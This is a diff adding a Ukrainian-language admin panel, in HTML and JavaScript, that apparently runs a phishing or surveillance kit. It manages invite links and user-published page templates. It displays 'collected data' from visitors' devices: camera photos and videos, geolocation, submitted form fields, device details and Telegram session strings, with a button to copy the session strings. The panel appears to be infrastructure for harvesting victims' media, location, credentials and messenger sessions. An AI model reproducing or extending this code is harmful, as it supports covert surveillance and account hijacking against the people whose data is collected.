@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Адмін-панель</title>
+    <style>
+        :root { --primary-color: #007bff; --danger-color: #dc3545; --success-color: #28a745; --light-gray: #f8f9fa; --gray: #6c757d; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--light-gray); margin: 0; padding: 1em; color: #333; }
+        .container { background: #fff; padding: 1rem 2rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 1200px; margin: 2rem auto; }
+        section { margin-bottom: 2rem; border-bottom: 1px solid #eee; padding-bottom: 1.5rem; }
+        h1, h2, h3, h4 { color: #333; }
+        h1 { border-bottom: 2px solid var(--primary-color); padding-bottom: 0.5rem;}
+        table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 0.9em; }
+        th, td { text-align: left; padding: 10px; border-bottom: 1px solid #ddd; word-break: break-all;}
+        th { background-color: var(--light-gray); font-weight: 600; }
+        tr:hover { background-color: #f1f1f1; }
+        button { padding: 5px 10px; border: 1px solid #ccc; border-radius: 4px; cursor: pointer; background-color: #fff; transition: all 0.2s; margin-right: 5px; }
+        button:hover { background: #e9e9e9; border-color: #999; }
+        button:disabled { background-color: #e9ecef; cursor: not-allowed; border-color: #ddd; color: #999;}
+        .btn-primary { background-color: var(--primary-color); color: #fff; border-color: var(--primary-color); }
+        .btn-danger { background-color: var(--danger-color); color: #fff; border-color: var(--danger-color); }
+        .status-active { color: var(--success-color); font-weight: bold; }
+        .status-suspended, .status-blocked { color: var(--danger-color); font-weight: bold; }
+        dialog { border-radius: 8px; border: 1px solid #ccc; box-shadow: 0 5px 15px rgba(0,0,0,0.2); padding: 0; width: 90%; max-width: 800px; }
+        dialog::backdrop { background: rgba(0,0,0,0.5); }
+        .modal-header { padding: 1rem; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .modal-body { padding: 1rem; max-height: 75vh; overflow-y: auto;}
+        .close-button { font-size: 1.5rem; border: none; background: none; cursor: pointer; }
+        .form-group { margin-bottom: 1rem; }
+        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+        .form-group input, .form-group textarea { width: 100%; padding: 8px; box-sizing: border-box; border-radius: 4px; border: 1px solid #ccc;}
+        .danger-zone { border: 2px solid var(--danger-color); padding: 1rem; margin-top: 1rem; border-radius: 5px; }
+        .clickable-data-entry { cursor: pointer; }
+        .clickable-data-entry:hover { background-color: #f0f0f0; }
+        .pagination-controls { display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 1rem; }
+        #data-viewer-content img, #data-viewer-content video { max-width: 100%; border-radius: 5px; margin-top: 10px; }
+        #data-viewer-content .form-data-grid { display: grid; grid-template-columns: auto 1fr; gap: 5px 15px; }
+        #data-viewer-content textarea { width: 100%; min-height: 120px; font-family: monospace; font-size: 0.9em; resize: vertical; margin-bottom: 10px; }
+        
+        #global-loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); display: none; justify-content: center;
+            align-items: center; z-index: 10000; backdrop-filter: blur(4px);
+        }
+        .loader-content {
+            background: white; padding: 2rem; border-radius: 0.75rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            display: flex; align-items: center; gap: 1rem;
+        }
+        .loader-spinner {
+            width: 2rem; height: 2rem; border: 4px solid #e5e7eb; border-top-color: #007bff;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="global-loader">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <span id="loader-message">Виконується...</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1>Панель керування</h1>
+        <div id="prompt-container"><p>Введіть ключ доступу для завантаження даних.</p></div>
+        <div id="admin-content" style="display:none;"></div>
+    </div>
+
+    <dialog id="user-details-modal">
+        <div class="modal-header">
+            <h2 id="modal-title">Деталі користувача</h2>
+            <button class="close-button" onclick="document.getElementById('user-details-modal').close()">&times;</button>
+        </div>
+        <div class="modal-body" id="modal-body-content"></div>
+    </dialog>
+    
+    <dialog id="data-viewer-modal">
+        <div class="modal-header">
+            <h2 id="data-viewer-title">Перегляд даних</h2>
+            <button class="close-button" onclick="document.getElementById('data-viewer-modal').close()">&times;</button>
+        </div>
+        <div class="modal-body" id="data-viewer-content"></div>
+    </dialog>
+
+    <script>
+        const promptContainer = document.getElementById('prompt-container');
+        const adminContent = document.getElementById('admin-content');
+        const globalLoader = document.getElementById('global-loader');
+        const loaderMessage = document.getElementById('loader-message');
+        let ADMIN_SECRET_KEY = sessionStorage.getItem('admin_key');
+        let dashboardData = {};
+
+        document.addEventListener('DOMContentLoaded', initializePanel);
+
+        function showLoader(message = 'Виконується...') {
+            loaderMessage.textContent = message;
+            globalLoader.style.display = 'flex';
+        }
+        function hideLoader() {
+            globalLoader.style.display = 'none';
+        }
+
+        async function initializePanel() {
+            if (!ADMIN_SECRET_KEY) {
+                ADMIN_SECRET_KEY = prompt('Введіть ключ доступу до адмін-панелі:');
+                if (!ADMIN_SECRET_KEY) {
+                    promptContainer.innerHTML = '<h1>Доступ заборонено</h1><p>Ключ не було введено.</p>';
+                    return;
+                }
+                sessionStorage.setItem('admin_key', ADMIN_SECRET_KEY);
+            }
+            promptContainer.innerHTML = '<p>Завантаження даних...</p>';
+            const success = await loadAndRenderDashboard();
+            if (success) {
+                promptContainer.style.display = 'none';
+                adminContent.style.display = 'block';
+            }
+        }
+        
+        async function apiCall(action, payload = {}) {
+            try {
+                function base64EncodeUnicode(str) { return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (match, p1) => String.fromCharCode('0x' + p1))); }
+                const encodedKey = base64EncodeUnicode(ADMIN_SECRET_KEY);
+                const res = await fetch('/.netlify/functions/admin-api', {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${encodedKey}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action, payload })
+                });
+                if (res.status === 401) {
+                    sessionStorage.removeItem('admin_key');
+                    promptContainer.innerHTML = '<h1>Помилка авторизації</h1><p>Ключ доступу недійсний. Оновіть сторінку і спробуйте ще раз.</p>';
+                    promptContainer.style.display = 'block'; adminContent.style.display = 'none';
+                    return null;
+                }
+                if (!res.ok) {
+                    const errorText = await res.text();
+                    alert(`Помилка API: ${errorText}`);
+                    return null;
+                }
+                return res;
+            } catch (err) {
+                alert(`Помилка мережі: ${err.message}`);
+                return null;
+            }
+        }
+
+        async function loadAndRenderDashboard() {
+            showLoader('Завантаження панелі...');
+            try {
+                const res = await apiCall('getDashboardData');
+                if (!res) return false;
+                dashboardData = await res.json();
+                
+                adminContent.innerHTML = `
+                    <section>
+                        <h2>Глобальні налаштування</h2>
+                        <div class="form-group">
+                            <label for="default-device-limit">Ліміт пристроїв за замовчуванням:</label>
+                            <input type="number" id="default-device-limit" value="${dashboardData.settings.defaultDeviceLimit || 3}">
+                            <button onclick="updateGlobalSettings()">Зберегти</button>
+                        </div>
+                    </section>
+                    <section>
+                        <h2>Створення посилання-запрошення</h2>
+                        <form id="generate-form" style="display: flex; gap: 10px; align-items: center;">
+                            <label for="uses">Кількість користувачів:</label>
+                            <input type="number" id="uses" value="1" min="1" required style="padding: 5px; width: 60px;">
+                            <button type="submit" class="btn-primary">Згенерувати</button>
+                        </form>
+                        <div id="new-link-container" style="margin-top: 1em;"></div>
+                    </section>
+                    <section>
+                        <h2>Активні посилання-запрошення</h2>
+                        <table id="codes-table"></table>
+                    </section>
+                    <section>
+                        <h2>Керування шаблонами сторінок</h2>
+                         <form id="add-template-form">
+                            <div class="form-group">
+                                <label for="template-name">Назва шаблону:</label> <input type="text" id="template-name" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="template-html">HTML-код шаблону:</label> <textarea id="template-html" required></textarea>
+                            </div>
+                            <button type="submit" class="btn-primary">Додати шаблон</button>
+                        </form>
+                        <h3 style="margin-top: 2rem;">Існуючі шаблони</h3>
+                        <table id="templates-table"></table>
+                    </section>
+                    <section>
+                        <h2>Користувачі (<span id="users-count">0</span>)</h2>
+                        <table id="users-table"></table>
+                    </section>
+                `;
+                renderUsersTable(); renderCodesTable(); renderTemplatesTable();
+                document.getElementById('generate-form').addEventListener('submit', generateLink);
+                document.getElementById('add-template-form').addEventListener('submit', addTemplate);
+                return true;
+            } finally {
+                hideLoader();
+            }
+        }
+
+        function renderUsersTable() {
+            const table = document.getElementById('users-table');
+            document.getElementById('users-count').textContent = dashboardData.users.length;
+            table.innerHTML = `
+                <thead><tr><th>Нікнейм</th><th>Статус</th><th>Пристроїв</th><th>Дата реєстрації</th><th>Дії</th></tr></thead>
+                <tbody>
+                    ${dashboardData.users.sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt)).map(u => `
+                        <tr>
+                            <td>${u.nickname}</td>
+                            <td><span class="status-${u.status}">${u.status}</span></td>
+                            <td>${u.sessionCount} / ${u.deviceLimitOverride || dashboardData.settings.defaultDeviceLimit}</td>
+                            <td>${new Date(u.createdAt).toLocaleString()}</td>
+                            <td><button onclick="showUserDetails('${u.userId}')">Деталі</button></td>
+                        </tr>
+                    `).join('') || `<tr><td colspan="5">Немає користувачів</td></tr>`}
+                </tbody>`;
+        }
+        
+        function renderCodesTable() {
+            const table = document.getElementById('codes-table');
+            table.innerHTML = `
+                <thead><tr><th>Код</th><th>Використано</th><th>Створено</th><th>Дії</th></tr></thead>
+                <tbody>
+                    ${dashboardData.refCodes.sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt)).map(c => `
+                        <tr>
+                            <td><code>${c.code}</code></td>
+                            <td>${c.originalUses - c.usesLeft} / ${c.originalUses}</td>
+                            <td>${new Date(c.createdAt).toLocaleString()}</td>
+                            <td>
+                                <button onclick="copyCodeLink('${c.code}', this)">Копіювати</button>
+                                <button class="btn-danger" onclick="deleteCode('${c.code}')">Видалити</button>
+                            </td>
+                        </tr>
+                    `).join('') || `<tr><td colspan="4">Немає кодів</td></tr>`}
+                </tbody>`;
+        }
+
+        function renderTemplatesTable() {
+            const table = document.getElementById('templates-table');
+            const templates = dashboardData.templates || [];
+            table.innerHTML = `
+                <thead><tr><th>Назва</th><th>ID Шаблону</th><th>Створено</th><th>Дії</th></tr></thead>
+                <tbody>
+                    ${templates.sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt)).map(t => `
+                        <tr>
+                            <td>${t.name}</td>
+                            <td><code>${t.templateId}</code></td>
+                            <td>${new Date(t.createdAt).toLocaleString()}</td>
+                            <td><button class="btn-danger" onclick="deleteTemplate('${t.templateId}', '${t.name}')">Видалити</button></td>
+                        </tr>
+                    `).join('') || `<tr><td colspan="4">Немає створених шаблонів</td></tr>`}
+                </tbody>`;
+        }
+        
+        async function showUserDetails(userId) {
+            const modal = document.getElementById('user-details-modal');
+            const modalBody = document.getElementById('modal-body-content');
+            document.getElementById('modal-title').textContent = 'Завантаження деталей...';
+            modalBody.innerHTML = '<p style="text-align: center; padding: 2rem;">Завантаження...</p>';
+            modal.showModal();
+
+            const res = await apiCall('getUserDetails', { userId });
+            if (!res || !res.ok) {
+                modalBody.innerHTML = '<p style="text-align: center; padding: 2rem; color: red;">Не вдалося завантажити дані користувача.</p>';
+                return;
+            }
+            const user = await res.json();
+            
+            document.getElementById('modal-title').textContent = `Деталі: ${user.nickname}`;
+            
+            const tg = user.telegramBinding || {};
+            let tgStatusText = 'Не прив\'язано';
+            if (tg.status === 'pending') tgStatusText = 'Очікує активації';
+            else if (tg.status === 'active') tgStatusText = `Активно (@${tg.username || 'user'})`;
+            else if (tg.status === 'suspended') tgStatusText = 'Призупинено';
+            else if (tg.status === 'bot_blocked') tgStatusText = '<span style="color: red;">Заблоковано бота</span>';
+
+            modalBody.innerHTML = `
+                <h4>Загальна інформація</h4>
+                <p><strong>ID:</strong> <code>${user.userId}</code></p>
+                <p><strong>Зареєстрований за кодом:</strong> <code>${user.registeredWithRef}</code></p>
+                <p><strong>Останній вхід:</strong> ${user.lastLoginAt ? new Date(user.lastLoginAt).toLocaleString() : 'Ніколи'}</p>
+                <p><strong>Опублікована сторінка:</strong> ${user.publishedPage ? `<a href="/page.html?id=${user.userId}" target="_blank">Переглянути</a>` : 'Немає'}</p>
+
+                <h4>Налаштування акаунту</h4>
+                <div class="form-group">
+                    <label>Статус акаунту:</label>
+                    <button class="${user.status === 'active' ? 'btn-danger' : 'btn-primary'}" onclick="updateUser('${userId}', '${user.status === 'active' ? 'suspended' : 'active'}', document.getElementById('user-device-limit').value)">
+                        ${user.status === 'active' ? 'Призупинити акаунт' : 'Активувати акаунт'}
+                    </button>
+                </div>
+                <div class="form-group">
+                    <label for="user-device-limit">Персональний ліміт пристроїв (0 або пусто = глобальний):</label>
+                    <input type="number" id="user-device-limit" value="${user.deviceLimitOverride || ''}">
+                    <button onclick="updateUser('${userId}', '${user.status}', document.getElementById('user-device-limit').value)">Зберегти ліміт</button>
+                </div>
+
+                <h4>Сеанси (Пристрої)</h4>
+                <table><thead><tr><th>IP</th><th>Відбиток</th><th>Статус</th><th>Ост. активність</th><th>Дії</th></tr></thead><tbody>
+                ${(user.sessions || []).map(s => `
+                    <tr>
+                        <td>${s.ip || 'N/A'}</td>
+                        <td><code>${(s.fingerprint || 'N/A').substring(0,10)}...</code></td>
+                        <td><span class="status-${s.status}">${s.status}</span></td>
+                        <td>${new Date(s.lastUsedAt).toLocaleString()}</td>
+                        <td>
+                            <button onclick="updateSession('${userId}', '${s.sessionId}', '${s.status === 'active' ? 'blocked' : 'active'}')">${s.status === 'active' ? 'Блокувати' : 'Розблок.'}</button>
+                            <button class="btn-danger" onclick="deleteSession('${userId}', '${s.sessionId}')">Видалити</button>
+                        </td>
+                    </tr>
+                `).join('') || `<tr><td colspan="5">Немає сеансів</td></tr>`}
+                </tbody></table>
+                
+                <hr style="margin: 1.5rem 0;">
+                <h4>Telegram Бот</h4>
+                <p><strong>Статус:</strong> ${tgStatusText}</p>
+                ${tg.activationId ? `<p><strong>ID активації:</strong> <code>${tg.activationId}</code></p>` : ''}
+                <div class="form-group">
+                    <button onclick="regenerateTelegramId('${userId}')">Перегенерувати ID</button>
+                    <button onclick="unbindTelegram('${userId}')" class="btn-danger">Відв'язати</button>
+                    ${tg.status === 'active' || tg.status === 'suspended' || tg.status === 'bot_blocked' ? `<button onclick="toggleTelegramStatus('${userId}')">${tg.status === 'active' ? 'Призупинити' : 'Активувати'}</button>` : ''}
+                </div>
+                
+                <hr style="margin: 1.5rem 0;">
+                <h4>Зібрані дані</h4>
+                <div id="collected-data-section">Завантаження...</div>
+                <div id="pagination-controls-container"></div>
+
+                <div class="danger-zone">
+                    <h4>Небезпечна зона</h4>
+                    <button class="btn-danger" onclick="deleteUser('${userId}', '${user.nickname}')">Повністю видалити користувача</button>
+                </div>
+            `;
+            await renderCollectedDataPage(userId, 1);
+        }
+
+        async function renderCollectedDataPage(userId, page) {
+            const dataSection = document.getElementById('collected-data-section');
+            const paginationContainer = document.getElementById('pagination-controls-container');
+            dataSection.innerHTML = 'Завантаження даних...';
+            paginationContainer.innerHTML = '';
+
+            const res = await apiCall('getCollectedDataForUser', { userId, page });
+            if (!res || !res.ok) {
+                dataSection.innerHTML = '<p style="color: red;">Не вдалося завантажити зібрані дані.</p>';
+                return;
+            }
+            const pageData = await res.json();
+            const { data, total, limit } = pageData;
+
+            if (total === 0) {
+                dataSection.innerHTML = '<p>Немає зібраних даних.</p>';
+                return;
+            }
+            
+            let collectedDataHtml = '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #eee; padding: 10px; border-radius: 5px;">';
+            data.forEach(item => {
+                let itemContent = '';
+                if (item.type === 'photos') itemContent = `${item.itemCount || 0} фото`;
+                else if (item.type === 'video') itemContent = `${item.itemCount || 0} відео`;
+                else if (item.type === 'location') itemContent = `Локація`;
+                else if (item.type === 'form') itemContent = `Форма: '${item.formId}'`;
+                else if (item.type === 'device_info') itemContent = 'Інфо про пристрій';
+                else if (item.type === 'telegram_session') itemContent = 'Сесія Telegram';
+                else itemContent = `Статус: ${item.status}`;
+                
+                collectedDataHtml += `<div class="clickable-data-entry" style="display: flex; justify-content: space-between; align-items: center; font-size: 0.9em; margin-top: 5px; padding: 5px; border-radius: 3px;" onclick="showDataEntryDetails('${userId}', '${item.collectedAt}')">
+                    <span>${new Date(item.collectedAt).toLocaleString()} - ${itemContent} (${item.fingerprint.substring(0,6)}...)</span>
+                    <button class="btn-danger" style="padding: 2px 5px;" onclick="event.stopPropagation(); deleteDataAdmin('${userId}', '${item.collectedAt}')">Видалити</button>
+                </div>`;
+            });
+            collectedDataHtml += '</div>';
+            dataSection.innerHTML = collectedDataHtml;
+
+            const totalPages = Math.ceil(total / limit);
+            if (totalPages > 1) {
+                let paginationHtml = '<div class="pagination-controls">';
+                paginationHtml += `<button ${page === 1 ? 'disabled' : ''} onclick="renderCollectedDataPage('${userId}', ${page - 1})">Назад</button>`;
+                paginationHtml += `<span>Сторінка ${page} з ${totalPages}</span>`;
+                paginationHtml += `<button ${page >= totalPages ? 'disabled' : ''} onclick="renderCollectedDataPage('${userId}', ${page + 1})">Вперед</button>`;
+                paginationHtml += '</div>';
+                paginationContainer.innerHTML = paginationHtml;
+            }
+        }
+        
+        async function showDataEntryDetails(userId, timestamp) {
+            const modalTitle = document.getElementById('data-viewer-title');
+            const modalContent = document.getElementById('data-viewer-content');
+            modalTitle.textContent = 'Завантаження...';
+            modalContent.innerHTML = '<p style="text-align: center; padding: 2rem;">Завантаження...</p>';
+            document.getElementById('data-viewer-modal').showModal();
+
+            const res = await apiCall('getSingleCollectedDataEntry', { userId, timestamp });
+            if (!res || !res.ok) {
+                modalContent.innerHTML = '<p style="text-align: center; color: red;">Не вдалося завантажити дані.</p>';
+                return;
+            }
+            const dataEntry = await res.json();
+
+            let contentHtml = `<p><strong>Час:</strong> ${new Date(dataEntry.collectedAt).toLocaleString()}</p>
+                               <p><strong>Пристрій:</strong> <code>${dataEntry.fingerprint}</code></p><hr>`;
+
+            if (dataEntry.type === 'photos') {
+                modalTitle.textContent = `Перегляд фото (${dataEntry.data.length} шт.)`;
+                dataEntry.data.forEach(src => { contentHtml += `<img src="${src}" alt="Collected photo">`; });
+            } else if (dataEntry.type === 'video') {
+                modalTitle.textContent = `Перегляд відео (${dataEntry.data.length} шт.)`;
+                dataEntry.data.forEach(src => { contentHtml += `<video src="${src}" controls></video>`; });
+            } else if (dataEntry.type === 'location') {
+                modalTitle.textContent = 'Перегляд геолокації';
+                 if (dataEntry.status === 'denied' || !dataEntry.data) {
+                    contentHtml += `<p style="color: red;">Доступ до геолокації заборонено або дані відсутні.</p>`;
+                } else {
+                    const { latitude, longitude } = dataEntry.data;
+                    contentHtml += `<p><strong>Координати:</strong> ${latitude}, ${longitude}</p>
+                                    <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Відкрити на Google Maps</a>`;
+                }
+            } else if (dataEntry.type === 'form') {
+                modalTitle.textContent = `Дані з форми '${dataEntry.formId}'`;
+                contentHtml += '<h4>Поля форми:</h4><div class="form-data-grid">';
+                for (const key in dataEntry.data) {
+                    contentHtml += `<strong>${key}:</strong> <span>${dataEntry.data[key] || '<i>(пусто)</i>'}</span>`;
+                }
+                contentHtml += '</div>';
+            } else if (dataEntry.type === 'device_info') {
+                modalTitle.textContent = 'Інформація про пристрій';
+                contentHtml += '<h4>Параметри:</h4><div class="form-data-grid">';
+                 for (const key in dataEntry.data) {
+                    contentHtml += `<strong>${key}:</strong> <span>${dataEntry.data[key] || '<i>(N/A)</i>'}</span>`;
+                }
+                contentHtml += '</div>';
+            } else if (dataEntry.type === 'telegram_session') {
+                modalTitle.textContent = 'Збережена сесія Telegram';
+                const sessionString = dataEntry.data.sessionString || '';
+                contentHtml += `<h4>Рядок сесії:</h4>
+                                <textarea readonly>${sessionString}</textarea>
+                                <button onclick="copySessionToClipboard(this, '${btoa(encodeURIComponent(sessionString))}')">Копіювати</button>`;
+            }
+            modalContent.innerHTML = contentHtml;
+        }
+
+        function copySessionToClipboard(button, base64Session) {
+             const sessionString = decodeURIComponent(atob(base64Session));
+             navigator.clipboard.writeText(sessionString).then(() => {
+                const originalText = button.textContent;
+                button.textContent = 'Скопійовано!';
+                setTimeout(() => { button.textContent = originalText; }, 2000);
+            }).catch(err => alert('Не вдалося скопіювати.'));
+        }
+
+        async function reloadAndShowUser(userId) {
+            const dashboardRes = await apiCall('getDashboardData');
+            if (dashboardRes && dashboardRes.ok) {
+                dashboardData = await dashboardRes.json();
+                renderUsersTable();
+                if (document.getElementById('user-details-modal').open) {
+                    await showUserDetails(userId);
+                }
+            }
+        }
+
+        async function deleteDataAdmin(userId, timestamp) {
+            if (confirm('Ви впевнені, що хочете видалити цей запис даних?')) {
+                showLoader('Видалення даних...');
+                try {
+                    await apiCall('deleteCollectedDataAdmin', { userId, timestamps: [timestamp] });
+                    if (document.getElementById('user-details-modal').open) {
+                       const currentPage = parseInt(document.querySelector('.pagination-controls span')?.textContent.match(/(\d+)/)?.[0] || '1', 10);
+                       await renderCollectedDataPage(userId, currentPage);
+                    }
+                } finally { hideLoader(); }
+            }
+        }
+        
+        async function addTemplate(e) { e.preventDefault(); const name = document.getElementById('template-name').value; const htmlContent = document.getElementById('template-html').value; showLoader('Додавання шаблону...'); try { const res = await apiCall('addTemplate', { name, htmlContent }); if (res) { document.getElementById('add-template-form').reset(); await loadAndRenderDashboard(); } } finally { hideLoader(); } }
+        async function deleteTemplate(templateId, name) { if (confirm(`Ви впевнені, що хочете видалити шаблон "${name}"?`)) { showLoader('Видалення шаблону...'); try { await apiCall('deleteTemplate', { templateId }); await loadAndRenderDashboard(); } finally { hideLoader(); } } }
+        async function generateLink(e) { e.preventDefault(); const uses = document.getElementById('uses').value; showLoader('Генерація посилання...'); try { const res = await apiCall('generateCode', { uses }); if (!res || !res.ok) return; const newCode = await res.json(); const link = `${window.location.protocol}//${window.location.host}/?ref=${newCode.code}`; document.getElementById('new-link-container').innerHTML = `<strong>Згенероване посилання:</strong> <input type="text" readonly style="width: 70%; padding: 5px;" value="${link}" onclick="this.select()">`; const refreshRes = await apiCall('getDashboardData'); if (refreshRes && refreshRes.ok) { dashboardData = await refreshRes.json(); renderCodesTable(); } } finally { hideLoader(); } }
+        async function deleteCode(code) { if (confirm(`Ви впевнені, що хочете видалити код "${code}"?`)) { showLoader('Видалення коду...'); try { await apiCall('deleteRefCode', { code }); await loadAndRenderDashboard(); } finally { hideLoader(); } } }
+        async function updateGlobalSettings() { const limit = document.getElementById('default-device-limit').value; showLoader('Оновлення налаштувань...'); try { await apiCall('updateGlobalSettings', { defaultDeviceLimit: limit }); await loadAndRenderDashboard(); } finally { hideLoader(); } }
+        async function updateUser(userId, status, limitInput) { const limit = limitInput === '' ? null : parseInt(limitInput, 10); showLoader('Оновлення користувача...'); try { await apiCall('updateUser', { userId, status, deviceLimitOverride: limit }); await reloadAndShowUser(userId); } finally { hideLoader(); } }
+        async function updateSession(userId, sessionId, status) { showLoader('Оновлення сесії...'); try { await apiCall('updateSession', { userId, sessionId, status }); await reloadAndShowUser(userId); } finally { hideLoader(); } }
+        async function deleteSession(userId, sessionId) { if (confirm(`Ви впевнені, що хочете видалити цей сеанс? Це дозволить користувачу увійти з нового пристрою.`)) { showLoader('Видалення сесії...'); try { await apiCall('deleteSession', { userId, sessionId }); await reloadAndShowUser(userId); } finally { hideLoader(); } } }
+        async function deleteUser(userId, nickname) { if (prompt(`Це дія незворотня. Щоб видалити користувача "${nickname}", введіть його нікнейм нижче:`) === nickname) { showLoader('Видалення користувача...'); try { await apiCall('deleteUser', { userId }); document.getElementById('user-details-modal').close(); await loadAndRenderDashboard(); } finally { hideLoader(); } } else { alert('Введено невірний нікнейм. Видалення скасовано.'); } }
+        async function unbindTelegram(userId) { if (confirm('Ви впевнені, що хочете відв\'язати Telegram від цього акаунту?')) { showLoader('Відв\'язка Telegram...'); try { await apiCall('unbindTelegram', { userId }); await reloadAndShowUser(userId); } finally { hideLoader(); } } }
+        async function regenerateTelegramId(userId) { showLoader('Перегенерація ID...'); try { await apiCall('regenerateTelegramId', { userId }); await reloadAndShowUser(userId); } finally { hideLoader(); } }
+        async function toggleTelegramStatus(userId) { showLoader('Зміна статусу...'); try { await apiCall('toggleTelegramStatus', { userId }); await reloadAndShowUser(userId); } finally { hideLoader(); } }
+        function copyCodeLink(code, buttonElement) { const link = `${window.location.protocol}//${window.location.host}/?ref=${code}`; navigator.clipboard.writeText(link).then(() => { const originalText = buttonElement.textContent; buttonElement.textContent = 'Скопійовано!'; setTimeout(() => { buttonElement.textContent = originalText; }, 2000); }); }
+    </script>
+</body>
+</html>
